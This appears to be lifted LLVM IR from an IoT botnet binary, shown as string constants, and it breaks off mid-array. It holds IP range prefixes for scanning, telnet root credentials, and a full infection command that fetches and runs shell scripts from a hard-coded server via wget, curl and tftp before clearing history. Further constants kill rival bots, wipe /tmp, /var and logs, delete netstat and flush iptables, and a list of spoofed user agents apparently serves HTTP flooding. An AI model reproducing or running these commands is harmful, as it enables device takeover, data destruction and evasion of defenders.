@global_var_36da8.2490 = constant [12 x i8] c"87.21.%d.%d\00"
@global_var_36db4.2492 = constant [12 x i8] c"87.22.%d.%d\00"
@global_var_36dc0.2494 = constant [12 x i8] c"87.23.%d.%d\00"
@global_var_36dcc.2496 = constant [12 x i8] c"87.24.%d.%d\00"
@global_var_36dd8.2498 = constant [12 x i8] c"87.25.%d.%d\00"
@global_var_36de4.2500 = constant [12 x i8] c"87.28.%d.%d\00"
@global_var_36df0.2502 = constant [12 x i8] c"87.29.%d.%d\00"
@global_var_36dfc.2504 = constant [11 x i8] c"87.3.%d.%d\00"
@global_var_36e08.2506 = constant [12 x i8] c"87.30.%d.%d\00"
@global_var_36e14.2508 = constant [11 x i8] c"87.4.%d.%d\00"
@global_var_36e20.2510 = constant [11 x i8] c"87.6.%d.%d\00"
@global_var_36e2c.2512 = constant [11 x i8] c"87.8.%d.%d\00"
@global_var_36e38.2514 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_36e48.2516 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_36e58.2518 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_36e68.2520 = constant [12 x i8] c"88.32.%d.%d\00"
@global_var_36e74.2522 = constant [12 x i8] c"88.33.%d.%d\00"
@global_var_36e80.2524 = constant [12 x i8] c"88.34.%d.%d\00"
@global_var_36e8c.2527 = constant [12 x i8] c"88.35.%d.%d\00"
@global_var_36e98.2529 = constant [12 x i8] c"88.36.%d.%d\00"
@global_var_36ea4.2531 = constant [12 x i8] c"88.38.%d.%d\00"
@global_var_36eb0.2533 = constant [12 x i8] c"88.40.%d.%d\00"
@global_var_36ebc.2535 = constant [12 x i8] c"88.42.%d.%d\00"
@global_var_36ec8.2537 = constant [12 x i8] c"88.44.%d.%d\00"
@global_var_36ed4.2539 = constant [12 x i8] c"88.46.%d.%d\00"
@global_var_36ee0.2541 = constant [12 x i8] c"88.48.%d.%d\00"
@global_var_36eec.2543 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_36ef8.2545 = constant [12 x i8] c"88.50.%d.%d\00"
@global_var_36f04.2547 = constant [12 x i8] c"88.52.%d.%d\00"
@global_var_36f10.2549 = constant [12 x i8] c"88.54.%d.%d\00"
@global_var_36f1c.2551 = constant [12 x i8] c"88.56.%d.%d\00"
@global_var_36f28.2553 = constant [12 x i8] c"88.58.%d.%d\00"
@global_var_36f34.2555 = constant [12 x i8] c"88.60.%d.%d\00"
@global_var_36f40.2557 = constant [12 x i8] c"88.61.%d.%d\00"
@global_var_36f4c.2559 = constant [12 x i8] c"88.62.%d.%d\00"
@global_var_36f58.2561 = constant [12 x i8] c"88.63.%d.%d\00"
@global_var_36f64.2563 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_36f70.2565 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_36f80.2567 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_36f8c.2569 = constant [12 x i8] c"94.80.%d.%d\00"
@global_var_36f98.2571 = constant [12 x i8] c"94.82.%d.%d\00"
@global_var_36fa4.2573 = constant [12 x i8] c"94.84.%d.%d\00"
@global_var_36fb0.2575 = constant [12 x i8] c"94.86.%d.%d\00"
@global_var_36fbc.2577 = constant [12 x i8] c"94.88.%d.%d\00"
@global_var_36fc8.2579 = constant [12 x i8] c"94.90.%d.%d\00"
@global_var_36fd4.2581 = constant [12 x i8] c"94.92.%d.%d\00"
@global_var_36fe0.2583 = constant [12 x i8] c"94.93.%d.%d\00"
@global_var_36fec.2585 = constant [12 x i8] c"94.94.%d.%d\00"
@global_var_36ff8.2587 = constant [12 x i8] c"94.95.%d.%d\00"
@global_var_37004.2589 = constant [13 x i8] c"95.224.%d.%d\00"
@global_var_37014.2591 = constant [13 x i8] c"95.228.%d.%d\00"
@global_var_37024.2593 = constant [13 x i8] c"95.230.%d.%d\00"
@global_var_37034.2595 = constant [13 x i8] c"95.231.%d.%d\00"
@global_var_37044.2597 = constant [13 x i8] c"95.232.%d.%d\00"
@global_var_37054.2599 = constant [13 x i8] c"95.234.%d.%d\00"
@global_var_37064.2601 = constant [13 x i8] c"95.236.%d.%d\00"
@global_var_37074.2603 = constant [13 x i8] c"95.238.%d.%d\00"
@global_var_37084.2605 = constant [13 x i8] c"95.240.%d.%d\00"
@global_var_37094.2607 = constant [13 x i8] c"95.241.%d.%d\00"
@global_var_370a4.2609 = constant [13 x i8] c"95.242.%d.%d\00"
@global_var_370b4.2611 = constant [13 x i8] c"95.244.%d.%d\00"
@global_var_370c4.2613 = constant [13 x i8] c"95.245.%d.%d\00"
@global_var_370d4.2615 = constant [13 x i8] c"95.246.%d.%d\00"
@global_var_370e4.2617 = constant [13 x i8] c"95.247.%d.%d\00"
@global_var_370f4.2619 = constant [13 x i8] c"95.248.%d.%d\00"
@global_var_37104.2621 = constant [13 x i8] c"95.250.%d.%d\00"
@global_var_37114.2623 = constant [13 x i8] c"95.252.%d.%d\00"
@global_var_37124.2625 = constant [13 x i8] c"95.253.%d.%d\00"
@global_var_37134.2627 = constant [13 x i8] c"95.254.%d.%d\00"
@global_var_37144.2629 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_49980.2631 = global i32 0
@global_var_321a0.2633 = constant [8 x i8] c"BusyBox\00"
@global_var_321a8.2634 = constant i32 36
@global_var_321ac.2635 = constant i32 35
@global_var_429e8.2636 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_321a0.2633, i32 0, i32 0), i8* bitcast (i32* @global_var_321a8.2634 to i8*), i8* bitcast (i32* @global_var_321ac.2635 to i8*)]
@global_var_32168.2638 = constant [7 x i8] c"nvalid\00"
@global_var_32170.2639 = constant [6 x i8] c"ailed\00"
@global_var_32178.2640 = constant [9 x i8] c"ncorrect\00"
@global_var_32184.2641 = constant [6 x i8] c"enied\00"
@global_var_3218c.2642 = constant [5 x i8] c"rror\00"
@global_var_32194.2643 = constant [7 x i8] c"oodbye\00"
@global_var_3219c.2644 = constant [4 x i8] c"bad\00"
@global_var_429c8.2645 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_32168.2638, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_32170.2639, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_32178.2640, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_32184.2641, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3218c.2642, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_32194.2643, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3219c.2644, i32 0, i32 0)]
@global_var_429b4 = external global i32
@global_var_31ff4.2652 = constant [7 x i8] c"telnet\00"
@global_var_31ffc.2653 = constant [5 x i8] c"root\00"
@global_var_32004.2654 = constant i32 0
@global_var_32008.2655 = constant [324 x i8] c"cd /tmp; wget http://159.89.35.204/bins.sh || curl -O http://159.89.35.204/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 159.89.35.204 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 159.89.35.204; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00"
@global_var_42998.2656 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_31ff4.2652, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_31ffc.2653, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_31ffc.2653, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_31ff4.2652, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_31ffc.2653, i32 0, i32 0), i8* bitcast (i32* @global_var_32004.2654 to i8*), i8* getelementptr inbounds ([324 x i8], [324 x i8]* @global_var_32008.2655, i32 0, i32 0)]
@global_var_37150.2658 = constant [3 x i8] c"\0D\0A\00"
@global_var_429a4.2660 = global [4 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_31ff4.2652, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_31ffc.2653, i32 0, i32 0), i8* bitcast (i32* @global_var_32004.2654 to i8*), i8* getelementptr inbounds ([324 x i8], [324 x i8]* @global_var_32008.2655, i32 0, i32 0)]
@global_var_429f8.2662 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_32168.2638, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_32170.2639, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_32178.2640, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_32184.2641, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3218c.2642, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_32194.2643, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3219c.2644, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_321a0.2633, i32 0, i32 0), i8* bitcast (i32* @global_var_321a8.2634 to i8*), i8* bitcast (i32* @global_var_321ac.2635 to i8*)]
@global_var_37154.2665 = constant i32 993024795
@global_var_371c0.2667 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_429b0.2669 = local_unnamed_addr global [324 x i8]* @global_var_32008.2655
@global_var_37358.2672 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_37368.2673 = constant [6 x i8] c"/tmp/\00"
@global_var_37370.2674 = constant [6 x i8] c"/var/\00"
@global_var_37378.2675 = constant [6 x i8] c"/dev/\00"
@global_var_37380.2676 = constant [10 x i8] c"/var/run/\00"
@global_var_3738c.2677 = constant [10 x i8] c"/dev/shm/\00"
@global_var_37398.2678 = constant [6 x i8] c"/mnt/\00"
@global_var_373a0.2679 = constant [7 x i8] c"/boot/\00"
@global_var_373a8.2680 = constant [6 x i8] c"/usr/\00"
@global_var_37298.2692 = constant [5 x i8] c"wget\00"
@global_var_372a0.2693 = constant [6 x i8] c"armv*\00"
@global_var_37234.2694 = constant [5 x i8] c"bot*\00"
@global_var_372a8.2695 = constant [6 x i8] c"ntpd*\00"
@global_var_37248.2696 = constant [7 x i8] c"hackz*\00"
@global_var_372b0.2697 = constant [8 x i8] c"shitty*\00"
@global_var_372b8.2698 = constant [6 x i8] c"jack*\00"
@global_var_3720c.2699 = constant [6 x i8] c"mips*\00"
@global_var_371ec.2700 = constant [5 x i8] c"sex*\00"
@global_var_372c0.2701 = constant [4 x i8] c"i86\00"
@global_var_372c4.2702 = constant [5 x i8] c"ssh*\00"
@global_var_3722c.2703 = constant [5 x i8] c"sh4*\00"
@global_var_3723c.2704 = constant [11 x i8] c"jackmeoff*\00"
@global_var_371f4.2705 = constant [6 x i8] c"tftp*\00"
@global_var_372cc.2706 = constant [4 x i8] c"i56\00"
@global_var_372d0.2707 = constant [5 x i8] c"mips\00"
@global_var_372d8.2708 = constant [7 x i8] c"mipsel\00"
@global_var_372e0.2709 = constant [4 x i8] c"sh4\00"
@global_var_372e4.2710 = constant [4 x i8] c"x86\00"
@global_var_372e8.2711 = constant [5 x i8] c"i686\00"
@global_var_372f0.2712 = constant [4 x i8] c"ppc\00"
@global_var_372f4.2713 = constant [5 x i8] c"i586\00"
@global_var_372fc.2714 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37298.2692, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_372a0.2693, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37234.2694, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_372a8.2695, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_37248.2696, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_372b0.2697, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_372b8.2698, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3720c.2699, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_371ec.2700, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_372c0.2701, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_372c4.2702, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3722c.2703, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_3723c.2704, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_371f4.2705, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_372cc.2706, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_372d0.2707, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_372d8.2708, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_372e0.2709, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_372e4.2710, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_372e8.2711, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_372f0.2712, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_372f4.2713, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_372f4.2713, i32 0, i32 0)]
@global_var_371d0.2716 = constant [8 x i8] c"jackmy*\00"
@global_var_371d8.2717 = constant [9 x i8] c"busybox*\00"
@global_var_371e4.2718 = constant [5 x i8] c"bin*\00"
@global_var_371fc.2719 = constant [5 x i8] c"arm*\00"
@global_var_37204.2720 = constant [8 x i8] c"mipsel*\00"
@global_var_37214.2721 = constant [8 x i8] c"mips64*\00"
@global_var_3721c.2722 = constant [6 x i8] c"i686*\00"
@global_var_37224.2723 = constant [7 x i8] c"sparc*\00"
@global_var_37250.2724 = constant [6 x i8] c"bruv*\00"
@global_var_37288.2737 = constant [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_37234.2694, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_3723c.2704, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_37248.2696, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_37250.2724, i32 0, i32 0)]
@global_var_373d8.2742 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_3745c.2746 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_1f9ac.2747 = constant i32 -442564500
@global_var_3746c.2749 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_37498.2751 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_374b0.2753 = constant [22 x i8] c"history -c;history -w\00"
@global_var_374c8.2755 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_374d8.2757 = constant [11 x i8] c"history -c\00"
@global_var_374e4.2759 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_374fc.2761 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_37510.2763 = constant [11 x i8] c"history -w\00"
@global_var_3751c.2765 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_37530.2767 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_37540.2769 = constant [22 x i8] c"service iptables stop\00"
@global_var_37558.2771 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_375a4.2773 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_375e4.2774 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_37624.2775 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_376b4.2776 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_376ec.2777 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_3770c.2778 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_37724.2779 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_3777c.2780 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_3781c.2781 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_37870.2782 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_378e4.2783 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_37924.2784 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_379dc.2785 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_37a30.2786 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_37a88.2787 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_37ae0.2788 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_37b20.2789 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_37b68.2790 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_37bc0.2791 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_37c2c.2792 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_37c84.2793 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_37cd4.2794 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_37cf8.2795 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_37d54.2796 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_37d64.2797 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_37d94.2798 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_37db8.2799 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_37ddc.2800 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_37df8.2801 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_37e38.2802 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_37ec4.2803 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_37f0c.2804 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_37f54.2805 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_37f9c.2806 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_37fe4.2807 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_38038.2808 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_38088.2809 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_380f4.2810 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_38148.2811 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_381a4.2812 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_38200.2813 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_38264.2814 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_382c0.2815 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_3831c.2816 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_38378.2817 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_383d8.2818 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_38420.2819 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_384b8.2820 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_38504.2821 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_38550.2822 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_385a0.2823 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_385e8.2824 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_3863c.2825 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_3868c.2826 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_386d4.2827 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_38720.2828 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_3876c.2829 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_387b4.2830 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_38804.2831 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_38854.2832 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_38888.2833 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_388bc.2834 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_38904.2835 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_375a4.2773, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_375e4.2774, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_37624.2775, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_376b4.2776, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_376ec.2777, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_3770c.2778, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_37724.2779, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_3777c.2780, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_3781c.2781, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_37870.2782, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_378e4.2783, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_37924.2784, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_379dc.2785, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_37a30.2786, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_37a88.2787, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_37ae0.2788, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_37b20.2789, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_37b68.2790, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_37bc0.2791, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_37c2c.2792, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_37c84.2793, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_37cd4.2794, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_37cf8.2795, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_37d54.2796, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_37d64.2797, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_37d94.2798, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_37db8.2799, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_37ddc.2800, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_37df8.2801, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_37e38.2802, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_37ec4.2803, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_37f0c.2804, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_37f54.2805, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_37f9c.2806, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_37fe4.2807, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_38038.2808, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_38088.2809, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_380f4.2810, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_38148.2811, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_381a4.2812, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_38200.2813, 